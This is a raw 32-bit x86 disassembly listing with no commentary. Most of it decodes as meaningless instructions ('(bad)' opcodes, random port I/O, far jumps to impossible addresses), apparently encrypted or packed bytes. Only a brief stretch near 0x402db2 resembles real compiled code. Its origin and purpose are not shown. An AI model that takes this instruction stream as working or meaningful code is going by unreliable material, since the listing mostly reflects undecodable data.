  4028aa:	int3   
  4028ab:	shl    BYTE PTR [ebp-0x49],1
  4028ae:	jnp    0x4028e1
  4028b0:	add    esp,ebp
  4028b2:	ins    DWORD PTR es:[edi],dx
  4028b3:	or     eax,0xa3cd5375
  4028b8:	int    0x4
  4028ba:	sti    
  4028bb:	ret    0xb0c7
  4028be:	jae    0x4028db
  4028c0:	popf   
  4028c1:	cdq    
  4028c2:	ror    BYTE PTR [ecx+ebp*4+0x16],1
  4028c6:	xchg   ebx,eax
  4028c7:	in     eax,dx
  4028c8:	pop    eax
  4028c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028ca:	or     edx,DWORD PTR [ecx-0x1eab69e8]
  4028d0:	cmp    al,0x33
  4028d2:	pop    ds
  4028d3:	int    0xe
  4028d5:	xchg   edx,eax
  4028d6:	jmp    0x4974:0x341fc292
  4028dd:	jbe    0x402959
  4028df:	sub    eax,0x40fc57ac
  4028e4:	mov    esi,0x1c3c240a
  4028e9:	xor    DWORD PTR [esi+0x2b],0x64
  4028ed:	popa   
  4028ee:	in     eax,dx
  4028ef:	cmp    eax,0xa8ccf06f
  4028f4:	iret   
  4028f5:	(bad)  
  4028f6:	jo     0x40291a
  4028f8:	pop    ebx
  4028f9:	(bad)  
  4028fa:	stos   BYTE PTR es:[edi],al
  4028fb:	(bad)
  402900:	loope  0x402964
  402902:	div    edx
  402904:	cld    
  402905:	stos   DWORD PTR es:[edi],eax
  402906:	sbb    DWORD PTR [esi],ebp
  402908:	pushf  
  402909:	sub    ch,al
  40290b:	shl    edi,cl
  40290d:	loope  0x4028a9
  40290f:	sti    
  402910:	dec    ecx
  402911:	ficomp WORD PTR [edi+ecx*2+0x34]
  402915:	shl    DWORD PTR [esi*2+0x4ed812fb],1
  40291c:	cmp    DWORD PTR [edx-0x1720ee63],esi
  402922:	push   0xa1c73438
  402927:	out    dx,eax
  402928:	sbb    eax,0xe0c58efb
  40292d:	mov    eax,ds:0x90de467
  402932:	std    
  402933:	(bad)  
  402934:	test   DWORD PTR [ebx-0x1],0xb813c308
  40293b:	imul   esp,ecx,0x673a31f6
  402941:	call   DWORD PTR [eax+0x6f]
  402944:	leave  
  402945:	test   al,0xb
  402947:	xchg   edi,eax
  402948:	shr    eax,cl
  40294a:	sahf   
  40294b:	stc    
  40294c:	ret    
  40294d:	pusha  
  40294e:	cmp    al,0xc7
  402950:	into   
  402951:	ins    BYTE PTR es:[edi],dx
  402952:	fld    DWORD PTR [ebx]
  402954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402955:	adc    al,0xf1
  402957:	shl    BYTE PTR [eax+0x4382db2e],cl
  40295d:	mov    edi,0x7a1cfdce
  402962:	push   esp
  402963:	mov    bl,0xea
  402965:	or     edi,DWORD PTR [ebp-0x4a]
  402968:	test   eax,0xace28d22
  40296d:	sahf   
  40296e:	or     DWORD PTR [esi-0x25],edi
  402971:	aam    0x55
  402973:	js     0x402950
  402975:	jns    0x40290e
  402977:	ret    0xcd0c
  40297a:	mov    WORD PTR [edx+0x64],fs
  40297d:	in     eax,0x15
  40297f:	jge    0x40295b
  402981:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402983:	int3   
  402984:	or     eax,0x10e57289
  402989:	jns    0x4029d7
  40298b:	mov    bl,0xbb
  40298d:	cs or  esp,ecx
  402990:	jmp    0x402973
  402992:	sbb    BYTE PTR [edx+0x3b],dl
  402995:	add    DWORD PTR [edi],esp
  402997:	mov    ss:0xf9bcfba8,eax
  40299d:	lods   al,BYTE PTR fs:[esi]
  40299f:	not    eax
  4029a1:	jmp    0xf218b3d5
  4029a6:	jmp    0x6111ed65
  4029ab:	std    
  4029ac:	push   ecx
  4029ad:	stc    
  4029ae:	jp     0x402a2f
  4029b0:	push   ss
  4029b1:	mov    ds:0x1ce7bcb0,eax
  4029b6:	or     bl,BYTE PTR [edx]
  4029b8:	push   cs
  4029b9:	rol    BYTE PTR [edx+0x5929ca1a],cl
  4029bf:	fs and bh,cl
  4029c2:	in     eax,dx
  4029c3:	out    0x64,al
  4029c5:	push   es
  4029c6:	sub    eax,0x64f9663a
  4029cb:	ins    DWORD PTR es:[edi],dx
  4029cc:	test   DWORD PTR [esi+0x40ed878e],0xa89b6567
  4029d6:	jmp    DWORD PTR [edi+eax*4+0x62]
  4029da:	js     0x402a59
  4029dc:	mov    bl,0xe2
  4029de:	cmc    
  4029df:	jle    0x402a2a
  4029e1:	mov    ecx,DWORD PTR [edx+0x75]
  4029e4:	or     dh,BYTE PTR [ebp+edx*1-0x4b175a96]
  4029eb:	icebp  
  4029ec:	inc    eax
  4029ed:	sbb    BYTE PTR [esi+ebx*4],bl
  4029f0:	pushf  
  4029f1:	loop   0x4029be
  4029f3:	mov    dh,0x8f
  4029f5:	or     esi,ebp
  4029f7:	data16 xor BYTE PTR ds:0x2ef26bcc,bh
  4029fe:	(bad)  
  4029ff:	rcr    bl,cl
  402a01:	fsubr  QWORD PTR [edi+0x76]
  402a04:	push   ebx
  402a05:	out    dx,eax
  402a06:	out    0xb1,eax
  402a08:	jns    0x402a60
  402a0a:	push   0xffffffdf
  402a0c:	add    BYTE PTR [ecx+0x1c3aac9f],al
  402a12:	pop    eax
  402a13:	or     ch,bl
  402a15:	mov    ds:0x9cb81fd5,eax
  402a1a:	jl     0x402a21
  402a1c:	scas   eax,DWORD PTR es:[edi]
  402a1d:	stc    
  402a1e:	mov    ebx,esi
  402a20:	jg     0x402a06
  402a22:	iret   
  402a23:	cmp    bl,BYTE PTR ds:0x1d790d12
  402a29:	repz or eax,0x1d43aed6
  402a2f:	mov    dl,0xa3
  402a31:	xchg   ebp,eax
  402a32:	and    edi,DWORD PTR [eax+0x70]
  402a35:	mov    dl,0x1f
  402a37:	mov    al,ds:0x83e00ac8
  402a3c:	cdq    
  402a3d:	mov    edi,0x4645a807
  402a42:	test   eax,0x207766de
  402a47:	sbb    DWORD PTR [eax],edx
  402a49:	and    al,al
  402a4b:	out    0x40,eax
  402a4d:	(bad)  
  402a4f:	js     0x402a36
  402a51:	add    eax,esi
  402a53:	jo     0x402a59
  402a55:	sub    eax,0x2ca54dd7
  402a5a:	inc    esi
  402a5b:	cmc    
  402a5c:	lds    edx,FWORD PTR [ebp+0x61]
  402a5f:	jg     0x402a10
  402a61:	in     eax,0xb3
  402a63:	ins    DWORD PTR es:[edi],dx
  402a64:	xchg   ecx,eax
  402a65:	push   es
  402a66:	mov    edx,0x28915dc2
  402a6b:	or     al,0xc0
  402a6d:	xor    BYTE PTR [ebx-0x796f766],cl
  402a73:	or     ch,BYTE PTR [edx+0x15]
  402a76:	inc    eax
  402a77:	mov    ds,WORD PTR [edx-0x1bc2a24f]
  402a7d:	xchg   ebx,eax
  402a7e:	xor    DWORD PTR [ebx+0x16],esi
  402a81:	outs   dx,DWORD PTR ds:[esi]
  402a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a83:	gs add al,0xec
  402a86:	mov    esp,DWORD PTR [edi-0x10]
  402a89:	shr    BYTE PTR [ecx-0x7c],1
  402a8c:	push   ebp
  402a8d:	xor    cl,BYTE PTR [edx]
  402a8f:	jo     0x402a19
  402a91:	xor    DWORD PTR [ecx-0xc88f7a4],edi
  402a97:	icebp  
  402a98:	adc    BYTE PTR ds:0x796f80dd,dl
  402a9e:	cmp    DWORD PTR [ecx+0x64666205],ebx
  402aa4:	push   ecx
  402aa5:	or     edi,DWORD PTR [ebx-0x75f8ae55]
  402aab:	dec    edx
  402aac:	daa    
  402aad:	cld    
  402aae:	scas   al,BYTE PTR es:[edi]
  402aaf:	and    eax,0x6351051a
  402ab4:	in     eax,dx
  402ab5:	jl     0x402abd
  402ab7:	dec    ebx
  402ab8:	sub    eax,0x10be095b
  402abd:	xor    eax,0x39079e59
  402ac2:	mov    ch,0xc0
  402ac4:	xchg   DWORD PTR [ebp+0x6e],esi
  402ac7:	add    ecx,0xd7be1081
  402acd:	loope  0x402ae8
  402acf:	fld    st(6)
  402ad1:	sub    ecx,esi
  402ad3:	mov    al,BYTE PTR [ecx-0x71e29fe2]
  402ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ada:	mov    bh,0x2a
  402adc:	xchg   esp,eax
  402add:	xor    edi,DWORD PTR [ebx-0x13]
  402ae0:	std    
  402ae1:	xor    esp,DWORD PTR [ebx+ebp*4-0x24]
  402ae5:	push   esp
  402ae6:	or     DWORD PTR [esp+esi*4],esp
  402ae9:	jl     0x402b2a
  402aeb:	lea    eax,[ecx-0x438c7983]
  402af1:	ficom  DWORD PTR [ebx+0x5545f763]
  402af7:	dec    ebx
  402af8:	push   eax
  402af9:	cmp    al,0xb5
  402afb:	icebp  
  402afc:	push   ecx
  402afd:	mov    dh,0x7c
  402aff:	pop    esi
  402b00:	jl     0x402aad
  402b02:	iret   
  402b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b04:	loopne 0x402b61
  402b06:	cmp    ah,BYTE PTR [ebp+0xf590015]
  402b0c:	pop    esi
  402b0d:	sbb    ah,BYTE PTR [esi]
  402b0f:	sub    ecx,eax
  402b11:	jmp    0x402db0
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	sbb    bl,BYTE PTR ds:0x128e5092
  402b28:	js     0x402ba2
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402ad1
  402b2f:	dec    ecx
  402b30:	mov    ds:0x1f8a077,eax
  402b35:	int3   
  402b36:	scas   eax,DWORD PTR es:[edi]
  402b37:	adc    al,0x2c
  402b39:	push   si
  402b3b:	out    0xa,al
  402b3d:	aas    
  402b3e:	enter  0x114d,0xb3
  402b42:	fisttp QWORD PTR [ecx]
  402b44:	into   
  402b45:	adc    BYTE PTR [esi],dh
  402b47:	dec    edi
  402b48:	jecxz  0x402ace
  402b4a:	mov    ecx,0xc575e43b
  402b4f:	push   ds
  402b50:	xor    BYTE PTR [ecx+0x54],ch
  402b53:	pop    eax
  402b54:	pop    edi
  402b55:	rep outs dx,BYTE PTR ds:[esi]
  402b57:	mov    ch,0x6
  402b59:	jno    0x402b0a
  402b5b:	mov    ds,ebp
  402b5d:	lds    ebx,FWORD PTR [edx*8+0x3aea416d]
  402b64:	push   es
  402b65:	pop    ecx
  402b66:	mov    dl,0xad
  402b68:	push   ecx
  402b69:	cmp    al,0x7a
  402b6b:	jo     0x402b7b
  402b6d:	xchg   ebp,eax
  402b6e:	sbb    edi,DWORD PTR [ebp-0x4f]
  402b71:	or     al,0x7b
  402b73:	jmp    0x7b532a93
  402b78:	mov    ah,0x28
  402b7a:	xchg   edi,eax
  402b7b:	(bad)
  402b80:	in     eax,dx
  402b81:	sub    al,ah
  402b83:	hlt    
  402b84:	addr16 pusha 
  402b86:	retf   
  402b87:	stos   DWORD PTR es:[edi],eax
  402b88:	icebp  
  402b89:	dec    esp
  402b8a:	push   esi
  402b8b:	leave  
  402b8c:	call   0x3b158994
  402b91:	jae    0x402b67
  402b93:	mov    fs:0x8523d42,al
  402b99:	adc    al,0xbd
  402b9b:	jle    0x402bd4
  402b9d:	icebp  
  402b9e:	sbb    edi,0xf
  402ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ba2:	scas   eax,DWORD PTR es:[edi]
  402ba3:	ret    
  402ba4:	xor    ecx,DWORD PTR [esp+ecx*1+0x30]
  402ba8:	shl    BYTE PTR [edx+0x53d1881d],1
  402bae:	fwait
  402baf:	xor    edx,0x8
  402bb2:	sbb    eax,0x42bc1128
  402bb7:	mov    eax,ebp
  402bb9:	sbb    DWORD PTR [ecx-0x28],ebp
  402bbc:	sub    dl,0xd0
  402bbf:	int    0xf
  402bc1:	cmp    bl,cl
  402bc3:	sbb    edx,ebp
  402bc5:	push   eax
  402bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bc7:	jmp    0x4015:0x37fea836
  402bce:	sub    cl,dl
  402bd0:	mov    ecx,DWORD PTR [edi]
  402bd2:	inc    ecx
  402bd3:	nop
  402bd4:	js     0x402ba2
  402bd6:	sahf   
  402bd7:	mov    ah,0x54
  402bd9:	xor    BYTE PTR [edx-0x11c5feb6],ch
  402bdf:	add    al,0xfd
  402be1:	outs   dx,DWORD PTR ds:[esi]
  402be2:	adc    cl,BYTE PTR [ebx+ebx*1]
  402be5:	ret    0x810a
  402be8:	push   ebx
  402be9:	in     al,dx
  402bea:	mov    esi,0xd745c2dc
  402bef:	in     eax,0x35
  402bf1:	loope  0x402bb9
  402bf3:	clc    
  402bf4:	in     al,0xf4
  402bf6:	xchg   esp,eax
  402bf7:	cdq    
  402bf8:	shr    bl,cl
  402bfa:	mov    eax,ds:0x5d1fd53d
  402bff:	or     esp,DWORD PTR [ebp*4+0x7aeaee33]
  402c06:	mov    eax,0x475e9167
  402c0b:	cli    
  402c0c:	pop    ecx
  402c0d:	aaa    
  402c0e:	pop    ss
  402c0f:	mov    BYTE PTR [ecx+0x2c],cl
  402c12:	xlat   BYTE PTR ds:[ebx]
  402c13:	ins    WORD PTR es:[edi],dx
  402c15:	(bad)  
  402c16:	sub    eax,0xefbfe6
  402c1b:	push   ebx
  402c1c:	push   esi
  402c1d:	push   ebx
  402c1e:	sbb    BYTE PTR [ecx-0x9],0xa7
  402c22:	cmp    DWORD PTR [ecx-0x7b629099],esp
  402c28:	leave  
  402c29:	jg     0x402c7c
  402c2b:	retf   0x83f2
  402c2e:	(bad)  
  402c2f:	jnp    0x402c55
  402c31:	or     cl,al
  402c33:	jae    0x402c82
  402c35:	mov    DWORD PTR [ecx+0x7d1dfdd1],ecx
  402c3b:	or     al,0xd7
  402c3d:	dec    esi
  402c3e:	ja     0x402c6c
  402c40:	mov    edx,0x11a3bb25
  402c45:	pop    ecx
  402c46:	aad    0xe
  402c48:	add    al,0x9e
  402c4a:	ret    0xf66e
  402c4d:	jne    0x402c96
  402c4f:	std    
  402c50:	and    eax,0xf24c4d1c
  402c55:	gs in  al,0x80
  402c58:	clc    
  402c59:	shl    BYTE PTR [edx+0x7188de14],cl
  402c5f:	mov    ebx,0xf031fbd6
  402c64:	ficomp WORD PTR [ecx]
  402c66:	push   ds
  402c67:	loope  0x402c2c
  402c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c6a:	jnp    0x402c82
  402c6c:	mov    dl,0x29
  402c6e:	and    BYTE PTR [edi+0x58],al
  402c71:	push   es
  402c72:	xor    bh,ah
  402c74:	retf   0x3108
  402c77:	push   ecx
  402c78:	pop    ebp
  402c79:	inc    ecx
  402c7a:	jo     0x402c15
  402c7c:	or     ebx,DWORD PTR [eax-0x63]
  402c7f:	imul   edx,eax,0x63
  402c82:	scas   al,BYTE PTR es:[edi]
  402c83:	js     0x402c10
  402c85:	icebp  
  402c86:	mov    ecx,0x5bad2f3a
  402c8b:	in     eax,dx
  402c8c:	mov    dl,0x48
  402c8e:	pop    ds
  402c8f:	mov    eax,0xf1b3662
  402c94:	jo     0x402cc3
  402c96:	xor    eax,0xf97b39c5
  402c9b:	ret    
  402c9c:	pop    ss
  402c9d:	sbb    eax,0xd44081c5
  402ca2:	ret    0xccb7
  402ca5:	sub    edx,ecx
  402ca7:	aaa    
  402ca8:	xor    al,dl
  402caa:	xor    ch,BYTE PTR [eax]
  402cac:	ins    BYTE PTR es:[edi],dx
  402cad:	xchg   ecx,eax
  402cae:	gs cld 
  402cb0:	(bad)  [eax-0x4548e19c]
  402cb6:	inc    esi
  402cb7:	clc    
  402cb8:	repnz adc BYTE PTR [edi+0x31],al
  402cbc:	mov    edi,0x167d6b76
  402cc1:	and    edx,0x6d16a223
  402cc7:	mov    DWORD PTR [ebp+0x37],eax
  402cca:	sub    al,0x9a
  402ccc:	(bad)  
  402ccd:	lahf   
  402cce:	cmp    eax,0xdf0775da
  402cd3:	out    0x97,eax
  402cd5:	adc    bh,BYTE PTR [edx]
  402cd7:	xchg   edi,eax
  402cd8:	mov    esi,0x98c25bf5
  402cdd:	in     al,0x3a
  402cdf:	mov    ebx,0x907a02d9
  402ce4:	inc    ebp
  402ce5:	loop   0x402d16
  402ce7:	dec    ecx
  402ce8:	add    eax,0x5b3a3b08
  402ced:	xlat   BYTE PTR ds:[ebx]
  402cee:	repz dec ecx
  402cf0:	idiv   DWORD PTR [edi-0x40853536]
  402cf6:	pop    ebp
  402cf7:	cdq    
  402cf8:	call   0xb0a3:0x294d2cb9
  402cff:	or     DWORD PTR [eax+0x58],edi
  402d02:	daa    
  402d03:	mov    ebp,0x93e824ec
  402d09:	(bad)  
  402d0b:	jl     0x402d47
  402d0d:	enter  0x97c2,0x98
  402d11:	inc    ebp
  402d12:	dec    edx
  402d13:	int3   
  402d14:	jbe    0x402d14
  402d16:	fist   WORD PTR [ebp+0x66fce98b]
  402d1c:	or     bl,dh
  402d1e:	push   es
  402d1f:	imul   DWORD PTR [esi+0xdbd91be]
  402d25:	xchg   esp,eax
  402d26:	mov    ebx,0xa92ba77e
  402d2b:	push   0x3846c65b
  402d30:	out    0xbe,eax
  402d32:	shr    DWORD PTR [ecx+0x6c],0xc
  402d36:	jmp    0x402cec
  402d38:	xchg   edx,eax
  402d39:	lea    edi,[ecx]
  402d3b:	fmul   QWORD PTR [ebx+0x75161512]
  402d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d42:	sbb    dl,BYTE PTR [ecx-0x19]
  402d45:	adc    BYTE PTR [ecx+0xdb5114f],0xa
  402d4c:	sub    ebp,esp
  402d4e:	jne    0x402cda
  402d50:	and    edx,DWORD PTR [eax]
  402d52:	xor    ecx,DWORD PTR [esi+0x1bfd3f98]
  402d58:	mov    esi,0x3d7bb5f9
  402d5d:	scas   eax,DWORD PTR es:[edi]
  402d5e:	scas   eax,DWORD PTR es:[edi]
  402d5f:	retf   0xb390
  402d62:	jo     0x402db7
  402d64:	inc    ebx
  402d65:	aaa    
  402d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d67:	dec    ebp
  402d68:	pop    ecx
  402d69:	mov    edx,DWORD PTR [edi-0x61906707]
  402d6f:	push   ecx
  402d70:	push   ss
  402d71:	xchg   esp,eax
  402d72:	pop    esi
  402d73:	jb     0x402d16
  402d75:	fisttp QWORD PTR [edi+ebx*4+0x619fdc37]
  402d7c:	cmp    ch,ah
  402d7e:	psubsb mm3,QWORD PTR [edi]
  402d81:	sub    ah,BYTE PTR [ecx]
  402d83:	test   al,0x6b
  402d85:	in     al,0x82
  402d87:	mov    ch,0x40
  402d89:	loopne 0x402d11
  402d8b:	push   esp
  402d8c:	iret   
  402d8d:	mov    bl,0xef
  402d8f:	(bad)  
  402d90:	pop    edi
  402d91:	pop    ds
  402d92:	mov    cl,0x71
  402d94:	jo     0x402d31
  402d96:	popa   
  402d97:	pushf  
  402d98:	std    
  402d99:	lock and eax,0xf8a69cd2
  402d9f:	repz retf 0x4efd
  402da3:	repnz mov edx,0x926032e1
  402da9:	fcmovb st,st(3)
  402dab:	mov    ss,WORD PTR [ecx]
  402dad:	and    cl,al
  402daf:	imul   ebp,DWORD PTR [ebx],0xffffffcf
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	cmp    eax,0xc3f8595
  402df7:	pop    ss
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402e65
  402dff:	loopne 0x402e73
  402e01:	stos   DWORD PTR es:[edi],eax
  402e02:	cwde   
  402e03:	cmp    ah,BYTE PTR [edi+0x6c8d5f1]
  402e09:	imul   esi,ebp,0x22805019
  402e0f:	push   esp
  402e10:	jp     0x402df0
  402e12:	aaa    
  402e13:	fmul   DWORD PTR [ecx-0xb3ac062]
  402e19:	dec    ecx
  402e1a:	cld    
  402e1b:	out    dx,al
  402e1c:	lahf   
  402e1d:	retf   
  402e1e:	ja     0x402e8f
  402e20:	sbb    edx,DWORD PTR [edx-0x66]
  402e23:	in     eax,dx
  402e24:	sbb    eax,DWORD PTR [eax+0x44]
  402e27:	jbe    0x402dc5
  402e29:	xchg   BYTE PTR ds:0xab12f1a,dh
  402e2f:	sbb    DWORD PTR [esi+eax*1],0xfbe08ba8
  402e36:	in     eax,0xc8
  402e38:	loope  0x402e08
  402e3a:	and    DWORD PTR [edi-0x3a],eax
  402e3d:	xor    eax,DWORD PTR [eax]
  402e3f:	pop    ecx
  402e40:	cmc    
  402e41:	or     eax,0x949320be
  402e46:	adc    al,0xc7
  402e48:	aas    
  402e49:	rcr    BYTE PTR [edx+0x29],1
  402e4c:	mov    ebx,0xb667cde2
  402e51:	xchg   edx,eax
  402e52:	std    
  402e53:	mov    esp,0x3c55a68f
  402e58:	jl     0x402e40
  402e5a:	shr    DWORD PTR [bp+di],0xaa
  402e5e:	pop    DWORD PTR [esi+0x1e]
  402e61:	gs dec ebp
  402e63:	mov    ebx,0xf419d2de
  402e68:	sbb    al,0xe2
  402e6a:	sbb    BYTE PTR ds:0xcc63d5ae,bh
  402e70:	fcom   DWORD PTR [edx+0x305b8cdd]
  402e76:	jecxz  0x402e18
  402e78:	pop    esp
  402e79:	sahf   
  402e7a:	mov    BYTE PTR [ecx-0x49],dh
  402e7d:	or     esi,DWORD PTR [edi+0x36c1b03c]
  402e83:	sub    DWORD PTR [ebx-0x1c49b482],ebp
  402e89:	aam    0xd8
  402e8b:	jmp    FWORD PTR [esi+0x4c8a6e67]
  402e91:	(bad)  
  402e92:	cmp    BYTE PTR [ebx*1-0x65b7fc1b],ch
  402e99:	push   0xffffffb6
  402e9b:	xchg   esi,eax
  402e9c:	mov    esp,0xb4de92a8
  402ea1:	mov    ebp,0xd95229bf
  402ea6:	sub    BYTE PTR [esi],dh
  402ea8:	bound  ecx,QWORD PTR ds:0x51e89b86
  402eae:	out    0xd5,eax
  402eb0:	dec    edi
  402eb1:	lods   eax,DWORD PTR ds:[esi]
  402eb2:	fiadd  WORD PTR [ebp-0x5542c7f4]
  402eb8:	inc    ecx
  402eb9:	xchg   esp,eax
  402eba:	int3   
  402ebb:	xor    DWORD PTR [ebx+0x75],0x5e
  402ebf:	xlat   BYTE PTR ds:[ebx]
  402ec0:	push   DWORD PTR [edi+ebp*2]
  402ec3:	iret   
  402ec4:	sbb    al,0xa7
  402ec6:	or     al,0x5c
  402ec8:	and    BYTE PTR ss:[edi],bl
  402ecb:	and    eax,0xb7f44d2c
  402ed0:	push   ebp
  402ed1:	jnp    0x402ef8
  402ed3:	adc    BYTE PTR [eax],al
  402ed5:	adc    eax,0x8f82cc58
  402eda:	xor    DWORD PTR [esp+ecx*4-0x616e4399],0x6f
  402ee2:	jecxz  0x402f0c
  402ee4:	repnz cmc 
  402ee6:	loope  0x402f21
  402ee8:	inc    ecx
  402ee9:	in     al,0x76
  402eeb:	mov    dh,0x2e
  402eed:	jnp    0x402f0e
  402eef:	mov    edi,0x122db516
  402ef4:	jns    0x402f5d
  402ef6:	mov    dh,0xe8
  402ef8:	arpl   ax,dx
  402efa:	pop    es
  402efb:	cmp    cl,dl
  402efd:	cmp    al,0x30
  402eff:	jae    0x402ec8
  402f01:	inc    edx
  402f02:	lods   eax,DWORD PTR ds:[esi]
  402f03:	dec    ebx
  402f04:	jl     0x402ed3
  402f06:	jo     0x402f62
  402f08:	in     eax,0x60
  402f0a:	cld    
  402f0b:	fadd   DWORD PTR [ecx]
  402f0d:	out    0x89,eax
  402f0f:	mov    ds:0x6bbf6ba2,al
  402f14:	scas   al,BYTE PTR es:[edi]
  402f15:	lods   al,BYTE PTR ds:[esi]
  402f16:	ret    
  402f17:	daa    
  402f18:	mov    ebp,0xd8bb6d36
  402f1d:	pop    esp
  402f1e:	mov    WORD PTR [edx+edx*4],es
  402f21:	mov    al,0x3c
  402f23:	add    BYTE PTR [esi+0x4],cl
  402f26:	es hlt 
  402f28:	rol    DWORD PTR [ecx-0x7b315f23],1
  402f2e:	cmp    bl,BYTE PTR [ecx+0x151fab94]
  402f34:	fcmovnbe st,st(6)
  402f36:	jmp    0x31751dcf
  402f3b:	dec    ebx
  402f3c:	ror    BYTE PTR [edi+0xd0a5a81],cl
  402f42:	sbb    ebx,DWORD PTR [ebx]
  402f44:	mov    edx,0xccff85a9
  402f49:	cmp    edx,DWORD PTR [ebx+0x61f109c7]
  402f4f:	and    edi,DWORD PTR [eax]
  402f51:	mov    esi,DWORD PTR [ebp-0x3a69edf2]
  402f57:	es adc ch,ch
  402f5a:	push   edi
  402f5b:	mov    bl,0xa8
  402f5d:	(bad)
  402f61:	pop    eax
  402f62:	ins    DWORD PTR es:[edi],dx
  402f63:	das    
  402f64:	aam    0x44
  402f66:	push   edx
  402f67:	mov    ebx,0x50a0c29b
  402f6c:	call   FWORD PTR [edi]
  402f6e:	push   ecx
  402f6f:	sub    eax,0x99030fdb
  402f74:	mov    edx,0x83b1537c
  402f79:	test   al,0xc7
  402f7b:	fistp  WORD PTR [edx-0x72872d2e]
  402f81:	xor    eax,0xeb91a97c
  402f86:	shl    BYTE PTR [edx],cl
  402f88:	push   0xffffffe7
  402f8a:	ins    BYTE PTR es:[edi],dx
  402f8b:	shl    BYTE PTR [ebx+0x6e],0xb2
  402f8f:	nop
  402f90:	push   esi
  402f91:	add    al,0xb0
  402f93:	std    
  402f94:	cmp    eax,ebx
  402f96:	pushf  
  402f97:	lds    edx,FWORD PTR [edx]
  402f99:	or     dh,dh
  402f9b:	int3   
  402f9c:	jae    0x403014
  402f9e:	cmc    
  402f9f:	push   ds
  402fa0:	imul   edx,DWORD PTR [ebp+0x35cfd914],0xffffffd3
  402fa7:	push   edi
  402fa8:	adc    BYTE PTR [eax-0x6e],dh
  402fab:	aad    0x83
  402fad:	gs mov edi,0x70938406
  402fb3:	cmp    al,0x2a
  402fb5:	xchg   esi,eax
  402fb6:	inc    edi
  402fb7:	push   ecx
  402fb8:	mov    esi,0x68c38191
  402fbd:	mov    es,WORD PTR [edi]
  402fbf:	fld    QWORD PTR [bp-0x620c]
  402fc4:	stc    
  402fc5:	sub    DWORD PTR [eax-0x3b],eax
  402fc8:	loop   0x402fc9
  402fca:	xor    DWORD PTR [esi-0x550cc9a2],eax
  402fd0:	mov    eax,0x75d99900
  402fd5:	add    BYTE PTR [edi-0x66],ah
  402fd8:	xchg   ecx,eax
  402fd9:	jb     0x402f9d
  402fdb:	jl     0x402f83
  402fdd:	iret   
  402fde:	pushf  
  402fdf:	sub    al,0x5d
  402fe1:	pop    esp
  402fe2:	retf   0x72ec
  402fe5:	xchg   edi,eax
  402fe6:	lods   al,BYTE PTR ds:[esi]
  402fe7:	mov    esi,0x6ef827e6
  402fec:	loop   0x402fc8
  402fee:	dec    edx
  402fef:	mov    bl,0xb6
  402ff2:	stos   BYTE PTR es:[edi],al
  402ff3:	imul   eax,DWORD PTR [edi+ebp*1+0xd],0xb64df19d
  402ffb:	int    0xda
  402ffd:	adc    BYTE PTR [ebp+eax*1-0x36729205],0x86
  403005:	inc    esi
  403006:	out    0x95,eax
  403008:	push   edi
  403009:	push   0x5
  40300b:	sub    eax,0x7769dbf9
  403010:	in     al,dx
  403011:	lahf   
  403012:	outs   dx,DWORD PTR ds:[esi]
  403013:	fdivr  st,st(0)
  403015:	xor    bl,BYTE PTR [edi+0x6eb2a501]
  40301b:	xor    BYTE PTR [ebx],bl
  40301d:	xor    BYTE PTR [ebx+eiz*8+0x653e1b52],al
  403024:	ficom  WORD PTR [ecx-0x2aaf52e0]
  40302a:	loop   0x402fde
  40302c:	jmp    0x6143:0x3cc10f5f
  403033:	scas   eax,DWORD PTR es:[edi]
  403034:	pop    es
  403035:	dec    edi
  403036:	fnstenv [ebx+0x2bf3f4c4]
  40303c:	or     al,0xe6
  40303e:	mov    ebx,0xf63dfc00
  403043:	xchg   edi,eax
  403044:	mov    WORD PTR [esi+0x42],fs
  403047:	inc    ebp
  403048:	test   DWORD PTR [ebx+0x24],ecx
  40304b:	arpl   WORD PTR [ebx+0x5bcafd78],bp
  403051:	cwde   
  403052:	pop    eax
  403053:	lock gs pop ds
  403056:	nop
  403057:	dec    esp
  403058:	mov    al,0x8
  40305a:	inc    esp
  40305b:	push   edi
  40305c:	mov    edi,0x8f5b964a
  403061:	xor    DWORD PTR [esi+0x6b],ebp
  403064:	leave  
  403065:	std    
  403066:	mov    ah,0x37
  403068:	or     BYTE PTR [ebx+ebx*1],0x8f
  40306c:	sub    al,0x38
  40306e:	xor    dl,BYTE PTR [edi+0x12]
  403071:	mov    DWORD PTR [esi+esi*8],ecx
  403074:	test   edx,eax
  403076:	aam    0xcf
  403078:	mov    ah,0xb3
  40307a:	das    
  40307b:	rcl    dh,0x14
  40307e:	fisub  WORD PTR [edi-0x74f7ba75]
  403084:	dec    ebp
  403085:	clc    
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	jecxz  0x403052
